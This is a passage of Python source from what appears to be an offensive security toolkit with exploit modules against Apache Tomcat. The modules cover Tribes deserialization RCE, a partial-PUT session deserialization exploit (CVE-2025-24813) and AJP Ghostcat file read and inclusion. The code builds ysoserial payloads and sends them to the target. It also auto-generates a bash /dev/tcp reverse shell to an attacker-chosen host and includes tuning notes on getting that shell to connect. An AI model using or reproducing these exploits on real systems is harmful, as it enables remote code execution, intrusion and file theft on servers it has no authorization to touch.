
    out_put = "版本=%s | Manager=%s | Tribes:%d=%s | AJP:%d=%s | CVE候选=%d 条" % (
        ver or "未知", mgr, tport, "开放" if tribes_open else "关",
        aport, "开放" if ajp_open else "关", len(cves))

    reachable = mgr != "不可达"
    return {"ok": reachable and bool(ver or tribes_open or ajp_open
                                     or mgr in ("存在(需认证)", "未授权可访问", "被拒绝(403)")),
            "output": out_put,
            "detail": "\n".join(lines) + ("\n\n★ " + "\n★ ".join(notes) if notes else ""),
            "version": ver,
            "manager": mgr,
            "tribes_open": tribes_open,
            "ajp_open": ajp_open,
            "cves": cves,
            "next": next_step}


def _tribes_member(host="127.0.0.1", tcp_listen_port=4001, unique_id=None):
    """构造 Tribes member 字节块（大端序）。

    结构（按 Tribes ChannelData/MemberSerialization 的 wire format）：
      "TRIBES-B" + 0x01 + 0x00 + body_len(4B)   # = 45 + len(host)，随 host 长度变，不能照抄 0x35
      + alive_time(8B) + tcp_listen_port(4B) + udp_listen_port(4B) + secure_port(4B)
      + host_len(1B) + host_bytes + command_len(4B=0) + domain_len(4B=0)
      + unique_id(16B) + payload_len(4B=0) + "TRIBES-E" + 0x01 + 0x00
    """
    hb = host.encode("utf-8", "ignore")[:255]
    body = (struct.pack(">Q", 0)                       # aliveTime
            + struct.pack(">i", int(tcp_listen_port))  # tcpListenPort
            + struct.pack(">i", 0)                     # udpListenPort
            + struct.pack(">i", 0)                     # securePort
            + bytes([len(hb)]) + hb                    # host
            + struct.pack(">i", 0)                     # command 长度
            + struct.pack(">i", 0)                     # domain 长度
            + (unique_id or os.urandom(16))[:16]       # uniqueId
            + struct.pack(">i", 0))                    # payload 长度
    return (b"TRIBES-B" + b"\x01\x00" + struct.pack(">i", len(body)) + body
            + b"TRIBES-E" + b"\x01\x00")


def _tribes_packet(ser_bytes, member=None, uid=None, ts=0x000000e8d4a51000):
    """组装完整的 Tribes ChannelData 报文。

      packet = "FLT2002" + outer_len(4B) + channel_data + "TLF2003"

      channel_data = options(4B=0) + timestamp(8B) + uid_len(4B=16) + uid(16B)
                   + member_len(4B) + member + ser_len(4B) + ser_bytes
    """
    uid = (uid or os.urandom(16))[:16]
    m = member if member is not None else b""
    ch = (struct.pack(">i", 0)                 # options
          + struct.pack(">Q", ts)              # timestamp
          + struct.pack(">i", len(uid)) + uid  # unique id
          + struct.pack(">i", len(m)) + m      # member（可为空）
          + struct.pack(">i", len(ser_bytes)) + ser_bytes)
    return b"FLT2002" + struct.pack(">i", len(ch)) + ch + b"TLF2003"


def _exec_cmd_check(cmd, target=""):
    """校验给 Runtime.getRuntime().exec(String) 的命令。返回 (能否用, 说明)。

    exec(String) 用 StringTokenizer 按空白切成 argv，**不经过 shell**：
      · 空格本身不是问题（"ls -la" 就是两个 argv，能正常跑）；
      · 真正失效的是 shell 元字符 —— 一旦 `>`、`|`、`&`、`;` 被空格和前后分隔成独立
        argv，bash 根本不会把它当重定向/管道，只会当普通参数传进去；
      · 所以带重定向的命令必须把重定向和它前面的目标塞进**同一个 token**，
        做法是把空格换成 ${IFS}（bash 会把它展开回空格）。
      · 反弹 shell 用工具箱已验证过的形态（本机实测能连）：
            bash -c bash${IFS}-i${IFS}>&/dev/tcp/<IP>/<PORT>${IFS}<&1
        结尾只能是 ${IFS}<&1。写成 ${IFS}0>&1 时桌面侧现象是「连上又立刻断」：
        accept 成功但 bash 随即退出、无回显（实测 3/3），不是 ambiguous redirect。
    """
    cmd = (cmd or "").strip()
    if not cmd:
        return False, "命令为空"
    if "${IFS}0>&1" in cmd:
        return False, (
            "命令结尾写成了 ${IFS}0>&1 —— 这个形态打不通。\n"
            "实测现象（不是报错，所以更容易误判）：TCP 三次握手【会】成功，监听侧能 accept，\n"
            "但 bash 随即退出、连接被 RST，发过去的命令没有任何回显 —— 拿不到可用会话。\n"
            "（注意：它并不是 bash 的 ambiguous redirect；那个错误只在重定向目标本身含\n"
            "  ${IFS} 时才出现，例如 `>${IFS}a${IFS}b`。这里 bash 能正常解析，只是不好使。）\n"
            "请改成 ${IFS}<&1：\n"
            "  bash -c bash${IFS}-i${IFS}>&/dev/tcp/<IP>/<PORT>${IFS}<&1\n"
            "  实测 3/3 连上且能发命令收回显。\n"
            "你填的是: %s" % cmd)
    warns = []
    tk = cmd.split()
    # 整条命令没有字面空格 → exec(String) 只切出 1 段 → 连 ${IFS} 一起被当成程序名
    if len(tk) == 1 and "${IFS}" in cmd:
        warns.append("整条命令没有字面空格，exec(String) 只会切出 1 段，"
                     "`%s` 会被整体当成程序名（实测 execve 直接 ENOENT，命令不会执行）。\n"
                     "  ${IFS} 只有在【某个 argv 内部需要空格】时才有用（例如 bash -c 后面那一段）；\n"
                     "  普通命令直接写字面空格即可，如 `touch /tmp/x`。" % tk[0])
    if tk[0] == "bash" and len(tk) >= 3 and tk[1] == "-c":
        if len(tk) > 3:
            warns.append("bash -c 后面跟了 %d 段；第 3 段之后的会被当成 $0/$1 位置参数，"
                         "不是你要执行的命令 —— 需要壳内空格请用 ${IFS} 拼成一段。" % (len(tk) - 2))
    elif len(tk) > 1:
        bad = [t for t in tk[1:] if t and t[0] in "><|&;`"]
        if bad:
            warns.append("这些段以 shell 元字符开头，exec 不经 shell、会原样当参数传给程序：%s\n"
                         "  需要重定向/管道请把它们和前面的目标拼进同一段（空格换 ${IFS}）。" % " ".join(bad))
    if warns:
        warns.insert(0, "⚠ 仍能发送，但下面这几点很可能让它不生效：")
    return True, "\n".join(warns)


def _reverse_cmd(p, target=""):
    """exec(String) 形态的反弹命令（cmd 留空时自动生成）。"""
    lhost = (p.get("lhost") or "").strip() or src_ip_for(target) or "127.0.0.1"
    lport = int(p.get("lport", 4444) or 4444)
    return "bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%d${IFS}<&1" % (lhost, lport)


def ex_tomcat_tribes_rce(target, p):
    """CVE-2026-34486：Tribes EncryptInterceptor 解密失败却仍旧放行 → 反序列化 RCE。

    原理：CVE-2026-29146 的补丁把 super.messageReceived(msg) 移出了 try 块，
    解密失败只记日志、原始未解密字节继续下发给别人 → receiver 侧正常反序列化。
    因此**不需要集群密钥**，只要能连到 Tribes receiver（默认 TCP 4000）。

    mode=check：URLDNS gadget + dnslog 域名，无命令执行的安全检测（推荐先用这个）
    mode=exec ：ysoserial RCE gadget（默认 CC6）；cmd 留空会自动拼已验证的反弹命令。
    """
    host = (target or "").strip()
    if "//" in host:
        host = urllib.parse.urlparse(normalize(host)).hostname or host
    host = host.split(":")[0] if ":" in host else host
    if not host:
        return {"ok": False, "output": "host 为空", "detail": ""}
    port = int(p.get("port", 4000) or 4000)
    mode = (p.get("mode") or "exec").strip().lower()
    to = float(p.get("timeout", 6) or 6)
    dnslog = (p.get("dnslog") or "").strip().strip("/")

    if mode == "check":
        if not dnslog:
            return {"ok": False,
                    "output": "check 模式必须填 dnslog 域名",
                    "detail": "URLDNS 检测需要一个带外 DNS 域名（如 xxxx.dnslog.cn / ceye.io），\n"
                              "目标若存在漏洞会去解析 <随机前缀>.<dnslog>；没有域名就无法判定。"}
        gadget = "URLDNS"
        # 加随机前缀：一是避免 DNS 缓存导致误判，二是便于在平台上区分多次检测
        rnd = os.urandom(5).hex()
        hostpart = dnslog.split("//")[-1].strip("/").split("/")[0]
        url = "http://%s.%s" % (rnd, hostpart)
        raw, err = yso_generate("URLDNS", url)
        if not raw:
            return {"ok": False, "output": "payload 生成失败", "detail": err}
        yso_arg = url
        warn = ""
        auto = False
    else:
        gadget = (p.get("gadget") or "CommonsCollections6").strip()
        cmd = (p.get("cmd") or "").strip()
        auto = False
        if not cmd or cmd.upper() in ("REVERSE", "SHELL"):
            cmd = _reverse_cmd(p, target)
            auto = True
        ok, note = _exec_cmd_check(cmd, target)
        if not ok:
            return {"ok": False, "output": "命令不可用", "detail": note}
        warn = note
        raw, err = yso_generate(gadget, cmd)
        if not raw:
            return {"ok": False, "output": "payload 生成失败", "detail": err}
        yso_arg = cmd

    member = _tribes_member(host=host, tcp_listen_port=int(p.get("member_port", 4001) or 4001))
    pkt = _tribes_packet(raw, member=member)
    sent, detail_conn = 0, ""
    try:
        s = socket.create_connection((host, port), timeout=to)
        s.settimeout(to)
        sent = s.sendall(pkt)
        time.sleep(0.6)          # 给接收端一点处理时间；它大概率不回包
        try:
            s.settimeout(0.8)
            echo = s.recv(512)
            detail_conn = "收到 %d 字节回应: %s" % (len(echo), echo[:64].hex())
        except Exception:
            detail_conn = "未收到回应（正常 —— Tribes receiver 对单播包通常不回数据）"
        s.close()
        send_ok = True
        send_err = ""
    except Exception as e:
        send_ok = False
        send_err = "%s: %s" % (type(e).__name__, e)
        detail_conn = "连接/发送失败"

    head_lines = [
        "目标            : %s:%d" % (host, port),
        "模式            : %s（gadget=%s）" % (mode, gadget),
        "ysoserial 参数  : %s" % yso_arg,
        "payload         : %d 字节（%s…）" % (len(raw), raw[:4].hex()),
        "member 块       : %d 字节" % len(member),
        "报文总长度      : %d 字节" % len(pkt),
        "发送结果        : %s%s" % ("已 sendall" if send_ok else "失败 " + send_err,
                                    "" if sent is None else " (sendall=%r)" % sent),
        "连接侧          : %s" % detail_conn,
    ]
    if auto:
        head_lines.insert(2, "自动生成命令    : cmd 留空 → 已用本机可达 IP 拼出反弹命令")
    if warn:
        head_lines.append("")
        head_lines.append(warn)

    if not send_ok:
        return {"ok": False,
                "output": "发送失败: %s" % send_err,
                "detail": "\n".join(head_lines) + "\n\n排查：Tribes receiver 默认 TCP 4000；\n"
                          "① 先用 tomcat.probe 确认 4000 是否可达；\n"
                          "② 目标可能只监听内网地址 / 有防火墙；\n"
                          "③ 也可能压根没配 <Membership> / ChannelReceiver。"}

    if mode == "check":
        verdict = ("已发送 URLDNS 检测包。★ 现在去 DNS 平台看是否有 %s 的解析记录 ——\n"
                   "  有记录 = 目标存在 CVE-2026-34486（完成了无命令执行的安全验证）；\n"
                   "  无记录 = 大概率不存在，或 4000 上的服务不是 Tribes / classpath 无 URLDNS 依赖。\n"
                   "  URLDNS 只依赖 JDK 自带类，几乎不受 gadget 缺失影响，是很干净的存在性判定。"
                   % yso_arg.split("//")[-1])
    else:
        verdict = ("已发送 RCE payload（%s）。★ 本次调用**无法知道是否成功**：\n"
                   "  Tribes 侧没有任何回显通道，是否执行只能靠带外确认 ——\n"
                   "    · 若 cmd 是反弹 shell：看你的 nc/监听是否上线；\n"
                   "    · 若 cmd 是 dnslog/curl 外带：去对应平台看记录；\n"
                   "    · 什么都没看到 = 可能是目标 classpath 里没有 %s 这条链（换 gadget 重试），\n"
                   "      也可能是版本未命中 CVE-2026-34486。\n"
                   "  ⚠ 不要以为「发送成功 = 利用成功」，这里的 ok 只代表字节发出去了。"
                   % (gadget, gadget))

    return {"ok": True,
            "output": "已向 %s:%d 发送 %d 字节 Tribes 报文（mode=%s, gadget=%s）—— "
                      "成功与否需靠带外/反弹上线确认" % (host, port, len(pkt), mode, gadget),
            "detail": "\n".join(head_lines) + "\n\n" + verdict,
            "packet_len": len(pkt),
            "gadget": gadget,
            "mode": mode}


def ex_tomcat_session_put(target, p):
    """CVE-2025-24813：partial PUT 往 TEMPDIR 写 session 文件 + 触发反序列化。

    两个 Tomcat 特性叠加才成立：
      ① DefaultServlet.executePartialPut() 的临时文件名 = 请求路径把 "/" 全替换成 "."，
         落在 ServletContext.TEMPDIR（$CATALINA_BASE/work/Catalina/<host>/<app>/）；
         9.0.98 的 doPut() finally **不删除**它（修复版才删）。
      ② FileStore 默认 directory="." → 解析到同一个 TEMPDIR，file(id) = id + ".session"。
    触发时 StandardSession.doReadObject() 第一个 readObject() 读到的就是 payload 顶层
    对象 → gadget 当场触发，之后的 (Long) 转型抛 ClassCastException 只是善后。
    所以**裸 ysoserial 字节即可**，不需要拼完整 Session 结构。

    ⚠ 默认配置打不了：DefaultServlet.readonly 默认 true（PUT 直接 405），
       还要求显式配 PersistentManager + FileStore。
    """
    base = normalize(target)
    if not base:
        return {"ok": False, "output": "target 为空", "detail": ""}
    to = int(p.get("timeout", 10) or 10)
    gadget = (p.get("gadget") or "CommonsCollections6").strip()
    cmd = (p.get("cmd") or "").strip()
    if not cmd or cmd.upper() in ("REVERSE", "SHELL"):
        cmd = _reverse_cmd(p, target)
    okc, cnote = _exec_cmd_check(cmd, target)
    if not okc:
        return {"ok": False, "output": "命令不可用", "detail": cnote}
    put_path = (p.get("put_path") or "/deserialize/session").strip()
    trigger_path = (p.get("trigger_path") or "/index.jsp").strip()
    sid = (p.get("session_id") or ".deserialize").strip()

    lines = []
    if cnote:
        lines.append("【命令分词提醒】\n%s" % cnote)
    # ① 探测可写性
    try:
        pr = http(base + "/probe.txt", method="PUT", data="test", timeout=to,
                  ctype="text/plain", allow_redirect=False)
        psc = pr["status"]
    except Exception as e:
        return {"ok": False, "output": "可写性探测失败: %s: %s" % (type(e).__name__, e),
                "detail": "目标不可达或协议异常。确认 %s 是 Tomcat 端口。" % base}
    lines.append("【① 可写性探测】 PUT %s/probe.txt → HTTP %s" % (base, psc))
    if psc == 0:
        # status=0 表示 urllib 连都没连上（http() 里把异常塞进了 err）
        return {"ok": False,
                "output": "目标不可达：%s" % (pr.get("err") or "连接失败"),
                "detail": "\n".join(lines) + "\n\n"
                          "连不上就谈不上鉴版本/判断可写性。先确认：\n"
                          "  1) target 里的主机/端口是不是 Tomcat（默认 8080，不是 80）；\n"
                          "  2) 目标是否在线、是否有网络路径（本机到目标的连通性）；\n"
                          "  3) ⚠ 若本机设置了系统代理，urllib 会把请求发给代理而不是目标 —— "
                          "跑本环境时请临时清掉 http_proxy / https_proxy 环境变量。\n"
                          "确认能连上之后先用 tomcat.probe 跑一遍。",
                "reachable": False}
    if psc == 405:
        return {"ok": False,
                "output": "HTTP 405 → DefaultServlet readonly=true，本漏洞打不了",
                "detail": "\n".join(lines) + "\n\n"
                          "★ 这不是模块 bug，是目标不满足前置条件。CVE-2025-24813 需要：\n"
                          "  1) conf/web.xml 里 DefaultServlet 的 readonly 设为 false（默认 true，"
                          "PUT 直接 405）；\n"
                          "  2) 应用显式配了 PersistentManager + FileStore（默认不开持久 session）；\n"
                          "  只有这两个同时成立，「partial PUT 写 TEMPDIR + FileStore 读回」才串得起来。\n"
                          "  如果确实是授权目标且你能改配置，改完重启再跑本模块。",
                "writable": False}
    if psc not in (200, 201, 204):
        lines.append("         ⚠ 非预期状态码，仍然继续尝试（有些环境改写过 DefaultServlet）")
    # 清理探测文件（best effort，PUT 支持的话 DELETE 通常也支持）
    try:
        http(base + "/probe.txt", method="DELETE", timeout=to, allow_redirect=False)
    except Exception:
        pass

    # ② 生成 payload
    raw, err = yso_generate(gadget, cmd)
    if not raw:
        return {"ok": False, "output": "payload 生成失败", "detail": "\n".join(lines) + "\n" + err}
    lines.append("【② payload】 ysoserial %s \"%s\" → %d 字节（%s…）"
                 % (gadget, cmd, len(raw), raw[:4].hex()))

    # ③ partial PUT
    n = len(raw)
    hdr = {"Content-Range": "bytes 0-%d/%d" % (n - 1, n)}
    try:
        ur = http(base + put_path, method="PUT", data=raw, headers=hdr,
                  timeout=to, ctype="application/octet-stream", raw=True,
                  allow_redirect=False)
        usc = ur["status"]
    except Exception as e:
        return {"ok": False, "output": "partial PUT 失败: %s: %s" % (type(e).__name__, e),
                "detail": "\n".join(lines)}
    lines.append("【③ partial PUT】 PUT %s%s   Content-Range: bytes 0-%d/%d → HTTP %s"
                 % (base, put_path, n - 1, n, usc))
    if usc == 409:
        lines.append("         409 也继续 —— 9.0.98 的 finally 不删临时文件，公开 PoC 就是 409 后利用成功")
    elif usc in (200, 201, 204):
        lines.append("         写入成功")
    else:
        lines.append("         ⚠ 非预期状态码，仍继续触发（建议也看一眼服务端日志）")

    # ④ 触发
    turl = base + trigger_path
    try:
        tr = http(turl, method="GET", headers={"Cookie": "JSESSIONID=%s" % sid},
                  timeout=to, allow_redirect=False)
        tsc, tbody = tr["status"], tr["body"]
    except Exception as e:
        return {"ok": False, "output": "触发请求失败: %s: %s" % (type(e).__name__, e),
                "detail": "\n".join(lines)}
    lines.append("【④ 触发】 GET %s  Cookie: JSESSIONID=%s → HTTP %s" % (turl, sid, tsc))

    hit_keys = ("ClassCastException", gadget, " InvocationTargetException",
                "ysoserial", "PriorityQueue", "TemplatesImpl")
    evid = [k.strip() for k in hit_keys if k.strip() in tbody]
    if tsc == 500 and evid:
        verdict = ("★ payload 已触发：命令在异常抛出**之前**就执行了\n"
                   "  （StandardSession.doReadObject() 第一个 readObject() 直接读到你写的对象，\n"
                   "   随后的 (Long) 转型抛 %s 只是善后，不影响命令执行）" % "、".join(evid))
        ok = True
    elif tsc == 500:
        verdict = ("返回 500 但响应体里没看到 ClassCastException / %s 字样 ——\n"
                   "  可能是别的 500（比如 JSP 本身报错），也可能是已被 WAF 吞掉的堆栈。\n"
                   "  建议：换一个确定会 getSession() 的 JSP，或直接用带外/反弹确认。" % gadget)
        ok = False
    else:
        verdict = ("返回 %s —— 多半没走到 session 查找。按顺序排查：\n"
                   "  1) 触发端点**必须会调用 request.getSession()**。默认 JSP（session=\"true\"）会，\n"
                   "     纯静态资源 / Servlet 不主动 getSession 的路径不会 → 换 trigger_path；\n"
                   "  2) 应用是否真的配了 PersistentManager + FileStore？没配的话 FileStore 根本不会\n"
                   "     去 TEMPDIR 找 <session_id>.session；\n"
                   "  3) session_id 是否和落地的临时文件名对得上（路径里的 / 会被换成 .）。" % tsc)
        ok = False

    lines.append("")
    lines.append("【判定】 %s" % verdict)
    return {"ok": ok,
            "output": verdict.split("\n")[0],
            "detail": "\n".join(lines) + ("\n\n---- 响应体前 800 字 ----\n" + tbody[:800] if tbody else ""),
            "writable": True,
            "put_status": usc,
            "trigger_status": tsc}


# ============================================================
# Tomcat 系列（第二批 4 个模块）
#   4. tomcat.ajp_ghostcat    CVE-2020-1938   AJP13 文件读取 / 文件包含
#   5. tomcat.manager_deploy  Manager 弱口令 + 部署 war
#   6. tomcat.session_filestore CVE-2020-9484 FileStore session 反序列化
#   7. tomcat.serref_variant  serrefA / serrefB 层级自动判定
# ============================================================

# ---------------- AJP13 编解码 ----------------
# 外层：0x12 0x34 + payload_len(2B 大端) + payload
# 注意：末尾**不要**多发一个 0x00（公开 PoC 00theway 那里多发了一个，是它的 bug）
_AJP_MAGIC = b"\x12\x34"
_AJP_RES_MAGIC = b"\x41\x42"

# SC_REQ_* 简码：头名可以直接用 2 字节 code，不必按 string 编码
_AJP_HEADER_CODES = {
    "accept": 0xA001, "accept-charset": 0xA002, "accept-encoding": 0xA003,
    "accept-language": 0xA004, "authorization": 0xA005, "connection": 0xA006,
    "content-type": 0xA007, "content-length": 0xA008, "cookie": 0xA009,
    "cookie2": 0xA00A, "host": 0xA00B, "pragma": 0xA00C, "referer": 0xA00D,
    "user-agent": 0xA00E,
}
_AJP_METHODS = {"OPTIONS": 1, "GET": 2, "HEAD": 3, "POST": 4, "PUT": 5,
                "DELETE": 6, "TRACE": 7, "PROPFIND": 8}

_AJP_SEND_HEADERS = 4
_AJP_SEND_BODY_CHUNK = 3
_AJP_END_RESPONSE = 5
_AJP_GET_BODY_CHUNK = 6


def ajp_string(s):
    """AJP string：长度(2B 大端，**不含**结尾 \\0) + 内容 + 0x00；None → 0xFFFF(null)。"""
    if s is None:
        return b"\xff\xff"
    b = s.encode("utf-8", "ignore") if isinstance(s, str) else bytes(s)
    return struct.pack(">H", len(b)) + b + b"\x00"


def ajp_int(n):
    """AJP integer 是 **2 字节**大端（不是 4 字节）—— 最容易写错的一处。"""
    return struct.pack(">H", int(n) & 0xFFFF)


def ajp_forward_request(method="GET", req_uri="/", protocol="HTTP/1.1",
                        remote_addr="127.0.0.1", remote_host="127.0.0.1",
                        server_name="localhost", server_port=80, is_ssl=False,
                        headers=None, attributes=None):
    """构造 AJP13 Forward Request（prefix_code=0x02）。返回 payload 字节（不含外层包头）。

    字段顺序（错一个字节 Tomcat 就丢包）：
      0x02, method(1B), protocol(string), req_uri(string), remote_addr(string),
      remote_host(string), server_name(string), server_port(integer 2B),
      is_ssl(1B), num_headers(integer 2B), headers…, attributes…, 0xFF
    """
    out = bytearray()
    m = _AJP_METHODS.get((method or "GET").upper(), 2)
    out += bytes([0x02, m])
    out += ajp_string(protocol)
    out += ajp_string(req_uri)
    out += ajp_string(remote_addr)
    out += ajp_string(remote_host)
    out += ajp_string(server_name)
    out += ajp_int(server_port)
    out += bytes([1 if is_ssl else 0])

    hdrs = []
    for k, v in (headers or {}).items():
        code = _AJP_HEADER_CODES.get((k or "").lower())
        hdrs.append(ajp_int(code) if code is not None else ajp_string(k))
        hdrs.append(ajp_string(v))
    out += ajp_int(len(hdrs) // 2)
    out += b"".join(hdrs)          # ← 别漏：只写了 num_headers 而没写头内容，Tomcat 直接丢包

    for k, v in (attributes or {}).items():
        out += bytes([0x0A])          # SC_A_REQ_ATTRIBUTE
        out += ajp_string(k)
        out += ajp_string(v)
    out += b"\xff"                    # 属性终止符；就这一个字节，后面不许再加 0x00
    return bytes(out)


def ajp_packet(payload):
    """外层包装：0x12 0x34 + len(payload)(2B 大端) + payload。**结尾不补 0x00**。"""
    return _AJP_MAGIC + struct.pack(">H", len(payload)) + payload


def ajp_transaction(sock, pkt, timeout=6.0):
    """发一包、收若干帧：读到 End Response(5) 就收工。

    不能「等连接关闭」—— Tomcat 处理完 AJP 请求通常保持连接不关，那样每次调用都要白等
    一个完整 timeout。这里按帧逐个读，拿到 End Response 立即返回，空闲超过 timeout 也算结束。
    """
    sock.settimeout(timeout)
    sock.sendall(pkt)
    buf = b""
    while True:
        head = ajp_read_exact(sock, 4, timeout)
        if len(head) < 4:
            break
        plen = struct.unpack(">H", head[2:4])[0]
        pay = ajp_read_exact(sock, plen, timeout)
        if len(pay) < plen:
            buf += head + pay        # 截断了也留着，方便诊断
            break
        buf += head + pay
        if pay and pay[0] == _AJP_END_RESPONSE:
            break
    return buf


def ajp_read_exact(sock, n, timeout):
    """读满 n 字节；读不到就返回已读部分（连接被 Tomcat 提前关很常见）。"""
    buf = b""
    deadline = time.time() + float(timeout)
    while len(buf) < n:
        left = deadline - time.time()
        if left <= 0:
            break
        try:
            sock.settimeout(left)
            b = sock.recv(n - len(buf))
        except Exception:
            break
        if not b:
            break
        buf += b
    return buf


def ajp_parse_response(data, logger=None):
    """解析容器的 AJP13 回包序列。返回 {"frames":[], "status":0, "headers":{}, "body":b"", "notes":[]}

    帧结构：0x41 0x42 + len(2B) + payload；payload[0] = 类型：
      3=Send Body Chunk / 4=Send Headers / 5=End Response / 6=Get Body Chunk
    ⚠ Send Body Chunk 尾部有一个 0x00，且**不计入 chunk_length**
      （ajp_header.c 源码注释证实，官方 AJPv13a BNF 反而漏写）。所以读完 N 字节
      内容后还要丢掉这 1 个字节，否则后续帧解析会整体错位。
    """
    out = {"frames": [], "status": 0, "headers": {}, "body": b"", "notes": []}
    i = 0
    while i + 4 <= len(data):
        if data[i:i + 2] != _AJP_RES_MAGIC:
            out["notes"].append("偏移 %d 处不是 AB 魔数（0x%02x%02x），后续解析放弃"
                                % (i, data[i], data[i + 1]))
            break
        plen = struct.unpack(">H", data[i + 2:i + 4])[0]
        if i + 4 + plen > len(data):
            out["notes"].append("偏移 %d 处帧长 %d 但只剩 %d 字节（截断）"
                                % (i, plen, len(data) - i - 4))
            break
        pay = data[i + 4:i + 4 + plen]
        typ = pay[0] if pay else 0
        out["frames"].append({"type": typ, "len": plen})
        if typ == _AJP_SEND_BODY_CHUNK:
            if len(pay) >= 3:
                n = struct.unpack(">H", pay[1:3])[0]
                chunk = pay[3:3 + n]
                out["body"] += chunk
                tail = pay[3 + n:4 + n]
                if tail != b"\x00":
                    out["notes"].append(
                        "Send Body Chunk 尾部不是 0x00 而是 %r —— 说明本次 n(%d) 或长度字段算错"
                        % (tail[:4], n))
                else:
                    out["frames"][-1]["tail_dropped"] = True
        elif typ == _AJP_SEND_HEADERS:
            j = 1
            if len(pay) >= j + 2:
                out["status"] = struct.unpack(">H", pay[j:j + 2])[0]
                j += 2
            # status reason phrase (string)：长度 + 内容 + 0x00
            if len(pay) >= j + 2:
                sl = struct.unpack(">H", pay[j:j + 2])[0]
                j += 2
                out["frames"][-1]["reason"] = pay[j:j + sl].decode("latin-1", "ignore")
                j += sl + 1
            if len(pay) >= j + 2:
                nh = struct.unpack(">H", pay[j:j + 2])[0]
                j += 2
                for _ in range(nh):
                    if pay[j:j + 2] == b"\xa0\x00":
                        j += 1      # 0xA001~0xA00E 简码：高字节为 0xA0
                        code = 0xA000 + pay[j]
                        j += 1
                        name = next((k for k, v in _AJP_HEADER_CODES.items()
                                     if v == code), "0x%04x" % code)
                    elif pay[j:j + 2] == b"\xff\xff":
                        j += 2
                        name = None
                    else:
                        sl = struct.unpack(">H", pay[j:j + 2])[0]
                        j += 2
                        name = pay[j:j + sl].decode("latin-1", "ignore")
                        j += sl + 1
                    if len(pay) < j + 2:
                        break
                    sl = struct.unpack(">H", pay[j:j + 2])[0]
                    j += 2
                    val = pay[j:j + sl].decode("latin-1", "ignore")
                    j += sl + 1
                    if name:
                        out["headers"][name.lower()] = val
        elif typ == _AJP_END_RESPONSE:
            out["frames"][-1]["reuse"] = pay[1] if len(pay) > 1 else 0
        elif typ == _AJP_GET_BODY_CHUNK:
            out["notes"].append("容器回 Get Body Chunk（要求继续发送请求体）—— 本工具不跟进")
        i += 4 + plen
    return out


def _ajp_target_host(target, p):
    host, port = (target or "").strip(), int(p.get("port", 8009) or 8009)
    if "//" in host:
        u = urllib.parse.urlparse(normalize(host))
        host = u.hostname or host.split("//")[-1].split(":")[0]
    elif ":" in host and not host.startswith("["):
        a, _, b = host.partition(":")
        if b.isdigit():
            host, port = a, int(b)
    return host, port


def ex_tomcat_ajp_ghostcat(target, p):
    """CVE-2020-1938（Ghostcat）：AJP13 文件读取 / 本地文件包含。

    Tomcat 把 AJP 属性直接 request.setAttribute()，而 DefaultServlet.getRelativePath()
    与 JspServlet.service() 都信任 javax.servlet.include.*：
      · 读取路径 = servlet_path + path_info，request_uri 非空才走这条分支
      · req_uri 决定进哪个 Servlet：不以 .jsp 结尾 → DefaultServlet（读文件）；
        必须以 .jsp 结尾 → JspServlet（文件包含 → RCE）
      · 被包含的文件不需要 .jsp 后缀（可以是 .png/.jpg）
      · ⚠ ../ 会被 RequestUtil.normalize() 拒绝 → **只能读当前 webapp 目录内的文件**
    """
    host, port = _ajp_target_host(target, p)
    if not host:
        return {"ok": False, "output": "host 为空", "detail": ""}
    to = float(p.get("timeout", 6) or 6)
    mode = (p.get("mode") or "probe").strip().lower()
    file_path = (p.get("file_path") or "WEB-INF/web.xml").strip().lstrip("/")
    jsp_file = (p.get("jsp_file") or "").strip()
    req_uri = (p.get("req_uri") or "/asdf").strip()
    ctx = (p.get("ctx") or "/").strip()

    common = dict(protocol="HTTP/1.1", remote_addr="127.0.0.1",
                  remote_host="127.0.0.1", server_name=host,
                  server_port=80, is_ssl=False,
                  headers={"Host": "%s:%d" % (host, port)})
    attrs = {}
    if mode == "read":
        if req_uri.lower().endswith(".jsp"):
            return {"ok": False, "output": "read 模式的 req_uri 不能以 .jsp 结尾",
                    "detail": "req_uri 决定走哪个 Servlet：不以 .jsp 结尾才进 DefaultServlet（读文件）。\n"
                              "你填的是 %s —— 那会进 JspServlet，读到的是渲染结果而不是源码。" % req_uri}
        req_uri = req_uri or "/asdf"
        # servlet_path + path_info 拼出最终路径：servlet_path="/" 时 path_info **不要带前导 /**，
        # 否则拼成 "//WEB-INF/web.xml"（多一层斜杠，部分容器取不到）。
        attrs = {"javax.servlet.include.request_uri": ctx or "/",
                 "javax.servlet.include.servlet_path": "/",
                 "javax.servlet.include.path_info": file_path}
    elif mode == "exec":
        if not jsp_file:
            return {"ok": False, "output": "exec 模式必须填 jsp_file",
                    "detail": "前置条件：目标 webapps 下必须**已经存在**一个你能控内容的文件"
                              "（不一定是 .jsp，比如 uploads/a.png 里写 JSP 代码即可）。\n"
                              "本模块只负责让 JspServlet 把它当 JSP 执行，**不负责写文件** ——\n"
                              "写文件请用工具箱已有的 shell.upload / webshell.drop。"}
        if not req_uri.lower().endswith(".jsp"):
            req_uri = req_uri if req_uri.endswith("/") else req_uri
            req_uri = "/asdf.jsp" if req_uri in ("", "/asdf") else req_uri + ".jsp"
        jf = jsp_file.lstrip("/")     # 同 read 模式：path_info 不带前导 /
        attrs = {"javax.servlet.include.request_uri": ctx or "/",
                 "javax.servlet.include.servlet_path": "/",
                 "javax.servlet.include.path_info": jf}
    elif mode != "probe":
        return {"ok": False, "output": "mode 只能是 probe / read / exec", "detail": ""}

    payload = ajp_forward_request("GET", req_uri=req_uri, attributes=attrs, **common)
    pkt = ajp_packet(payload)

    try:
        s = socket.create_connection((host, port), timeout=to)
    except Exception as e:
        return {"ok": False, "output": "连不上 %s:%d：%s: %s" % (host, port, type(e).__name__, e),
                "detail": "先用 tomcat.probe 看 AJP 8009 是否开放；\n"
                          "AJP 默认只在本地或受 RemoteAddrValve 保护的范围可达。"}
    head = [
        "目标        : %s:%d" % (host, port),
        "模式        : %s" % mode,
        "req_uri     : %s（决定进 DefaultServlet 还是 JspServlet）" % req_uri,
        "属性        : %s" % (attrs if attrs else "无（probe 模式不带任何恶意属性）"),
        "payload     : %d 字节（0x%04X）" % (len(payload), len(payload)),
        "整包        : %d 字节，开头 %s" % (len(pkt), pkt[:4].hex(" ")),
    ]
    try:
        raw = ajp_transaction(s, pkt, to)
    except Exception as e:
        try:
            s.close()
        except Exception:
            pass
        return {"ok": False, "output": "发送/接收失败: %s: %s" % (type(e).__name__, e),
                "detail": "\n".join(head)}
    try:
        s.close()
    except Exception:
        pass

    res = ajp_parse_response(raw)
    head.append("回包        : %d 字节，%d 帧（%s）"
                % (len(raw), len(res["frames"]),
